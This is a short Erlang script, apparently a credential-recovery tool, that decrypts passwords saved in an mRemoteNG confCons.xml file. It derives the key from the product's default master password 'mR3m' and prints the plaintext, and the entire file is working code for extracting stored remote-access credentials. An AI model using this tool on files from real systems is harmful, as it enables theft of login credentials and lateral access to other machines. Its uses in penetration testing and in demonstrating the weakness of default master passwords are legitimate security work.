-module(mBruteNG).
-compile(export_all).

main() ->
  decrypt(),
  erlang:halt().

decrypt() ->
    % Default password in mRemoteNG
    Password = <<"mR3m">>,
    % Replace this to string in your confCons.xml.
    Encrypted = "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==",
    Decoded = base64:decode(Encrypted),
    Aad = binary_part(Decoded, 0, 16),
    Salt = binary_part(Decoded, 0, 16),
    Nonce = binary_part(Decoded, 16, 16),
    Ciphertext = binary_part(Decoded, 32, 16),
    Tag = binary_part(Decoded, byte_size(Decoded), -16),

    Key = crypto:pbkdf2_hmac(sha, Password, Salt, 1000, 32),

    Plaintext = crypto:crypto_one_time_aead(aes_256_gcm, Key, Nonce, Ciphertext, Aad, Tag, false),
    io:format("Password: ~s~n", [Plaintext]).

